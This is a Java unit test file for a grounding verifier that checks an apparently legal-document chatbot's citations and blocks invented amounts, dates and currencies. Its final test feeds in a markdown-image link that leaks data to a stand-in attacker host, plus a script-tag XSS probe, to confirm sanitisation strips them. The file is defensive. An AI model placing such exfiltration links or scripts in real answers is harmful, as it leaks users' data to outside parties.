package com.idp.chat.service;

import static org.assertj.core.api.Assertions.assertThat;

import com.idp.chat.domain.Chunk;
import com.idp.chat.domain.Citation;
import java.util.List;
import java.util.UUID;
import org.junit.jupiter.api.Test;

/** SEC-031: las citas se validan contra los fragmentos; SEC-048: el texto libre tambien. */
class GroundingVerifierTest {

    private final GroundingVerifier verifier = new GroundingVerifier();
    private final UUID id = UUID.randomUUID();
    private final Chunk chunk = new Chunk(id, UUID.randomUUID(), 0, 3,
            "El juzgado ordena el embargo\npor un monto de $1,500,000.00 contra el titular.", 0.9);

    @Test
    void aceptaCitaLiteralYLaSustituyePorNumero() {
        var r = verifier.verify("Monto embargado. [chunk:" + id + "] \"monto de $1,500,000.00\" Fin.", List.of(chunk));

        assertThat(r.invalid()).isZero();
        assertThat(r.ungrounded()).isZero();
        assertThat(r.citations()).containsExactly(new Citation(id, 3, "monto de $1,500,000.00"));
        assertThat(r.text()).isEqualTo("Monto embargado. [1] Fin.");
    }

    @Test
    void toleraDiferenciasDeEspaciosEnBlancoYGuardaLaCitaNormalizada() {
        var r = verifier.verify("[chunk:" + id + "] \"embargo por un monto\"", List.of(chunk));

        assertThat(r.invalid()).isZero();
        assertThat(r.citations()).containsExactly(new Citation(id, 3, "embargo por un monto"));
    }

    @Test
    void aceptaComillasTipograficasYEscapadas() {
        assertThat(verifier.verify("[chunk:" + id + "] “contra el titular”", List.of(chunk)).citations()).hasSize(1);
        Chunk quoted = new Chunk(id, UUID.randomUUID(), 0, 1, "dijo \"si acepto\" ante el juez", 1);
        assertThat(verifier.verify("[chunk:" + id + "] \"dijo \\\"si acepto\\\" ante el\"", List.of(quoted)).citations())
                .hasSize(1);
    }

    @Test
    void rechazaTextoInventadoChunkAjenoCitaCortaYMarcadoresMalFormados() {
        UUID other = UUID.randomUUID();
        assertThat(verifier.verify("[chunk:" + id + "] \"monto de 9 pesos inventado\"", List.of(chunk)).invalid())
                .isEqualTo(1);
        assertThat(verifier.verify("[chunk:" + other + "] \"contra el titular\"", List.of(chunk)).invalid())
                .isEqualTo(1);
        assertThat(verifier.verify("[chunk:" + id + "] \"el titular\"", List.of(chunk)).invalid()).isEqualTo(1);
        assertThat(verifier.verify("[chunk:xyz] \"contra el titular\"", List.of(chunk)).invalid()).isEqualTo(1);
        assertThat(verifier.verify("[chunk:" + id + "] sin comillas", List.of(chunk)).invalid()).isEqualTo(1);
    }

    @Test
    void respuestaSinCitasYDeduplicacion() {
        var none = verifier.verify("El monto es 5.", List.of(chunk));
        assertThat(none.citations()).isEmpty();
        assertThat(none.invalid()).isZero();
        assertThat(none.abstention()).isFalse();

        var dup = verifier.verify("A [chunk:" + id + "] \"contra el titular\" B [chunk:" + id
                + "] \"contra el titular\"", List.of(chunk));
        assertThat(dup.citations()).hasSize(1);
        assertThat(dup.text()).isEqualTo("A [1] B [1]");
    }

    @Test
    void detectaAbstencionConYSinAcentos() {
        assertThat(verifier.verify("Información insuficiente", List.of(chunk)).abstention()).isTrue();
        assertThat(verifier.verify("INFORMACION INSUFICIENTE.", List.of(chunk)).abstention()).isTrue();
        assertThat(verifier.verify("El monto es 5", List.of(chunk)).abstention()).isFalse();
    }

    // ---- SEC-048: el texto libre no puede afirmar hechos ausentes de las citas ---------------------------------

    private GroundingVerifier.Result check(String prefix) {
        return verifier.verify(prefix + " [chunk:" + id + "] \"monto de $1,500,000.00\"", List.of(chunk));
    }

    @Test
    void bloqueaCifraInventadaAunConCitaTrivialValida() {
        assertThat(check("El monto embargado es de 9.999.999 pesos.").ungrounded()).isEqualTo(1);
        assertThat(check("Se embargaron $2.500.000.").ungrounded()).isEqualTo(1);
    }

    @Test
    void aceptaElMismoMontoConOtroFormatoYEnLetras() {
        assertThat(check("El monto es $1.500.000,00.").ungrounded()).isZero();
        assertThat(check("El monto es 1500000.").ungrounded()).isZero();
        assertThat(check("El monto es un millon quinientos mil pesos.").ungrounded()).isZero();
    }

    @Test
    void bloqueaMontoEnLetrasInventado() {
        assertThat(check("El monto es dos millones quinientos mil pesos.").ungrounded()).isEqualTo(1);
        assertThat(check("El monto es tres millones de pesos.").ungrounded()).isEqualTo(1);
    }

    @Test
    void fechaReformateadaLegitimaPasaYFechaDistintaNo() {
        Chunk dated = new Chunk(id, UUID.randomUUID(), 0, 1,
                "Vigente desde el 15 de marzo de 2024 y hasta el 30/04/2024 contra el titular.", 0.9);
        String cite = " [chunk:" + id + "] \"contra el titular\"";
        assertThat(verifier.verify("Rige desde 15/03/2024." + cite, List.of(dated)).ungrounded()).isZero();
        assertThat(verifier.verify("Rige desde 2024-03-15 hasta el 30 de abril de 2024." + cite, List.of(dated))
                .ungrounded()).isZero();
        assertThat(verifier.verify("Rige desde el 16 de marzo de 2024." + cite, List.of(dated)).ungrounded())
                .isEqualTo(1);
        assertThat(verifier.verify("Rige desde el 15/04/2024." + cite, List.of(dated)).ungrounded()).isEqualTo(1);
    }

    @Test
    void numeroQueSoloApareceEnOtroFragmentoNoCuenta() {
        Chunk other = new Chunk(UUID.randomUUID(), chunk.documentId(), 1, 4, "Radicado 2023-00987 del juzgado.", 0.8);
        var r = verifier.verify("El radicado es 2023-00987. [chunk:" + id + "] \"contra el titular\"",
                List.of(chunk, other));
        assertThat(r.invalid()).isZero();
        assertThat(r.ungrounded()).isPositive();
    }

    @Test
    void losMarcadoresDeCitaNoCuentanComoCifras() {
        var r = verifier.verify("Contra el titular. [chunk:" + id + "] \"contra el titular\" Si.", List.of(chunk));
        assertThat(r.text()).contains("[1]");
        assertThat(r.ungrounded()).isZero();
    }

    @Test
    void bloqueaMonedaExtranjeraNoDocumentada() {
        assertThat(check("El monto es 1.500.000 USD.").ungrounded()).isEqualTo(1);
    }

    @Test
    void elTextoLibreSeSanea() {
        var r = verifier.verify("Ver ![x](https://atacante.example/?q=dato) y <script>alert(1)</script>"
                + "[chunk:" + id + "] \"contra el titular\"", List.of(chunk));
        assertThat(r.text()).doesNotContain("atacante").doesNotContain("script").doesNotContain("alert");
        assertThat(r.ungrounded()).isZero();
    }
}
